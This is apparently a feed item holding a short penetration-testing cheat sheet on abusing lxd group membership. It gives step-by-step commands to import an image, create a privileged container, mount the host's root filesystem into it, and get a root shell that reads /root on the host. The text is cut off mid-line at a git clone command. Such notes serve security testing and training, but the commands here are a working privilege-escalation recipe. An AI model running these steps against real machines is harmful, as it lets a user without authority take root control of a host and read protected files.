item.title: lxd
item.description: Basic Commands # Check if user in lxd group id # List containers lxc list # List images lxc image list Abuse #1: Mount host’s file system # Upload a 656 bytes conatiner image echo  | base64 -d > test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.
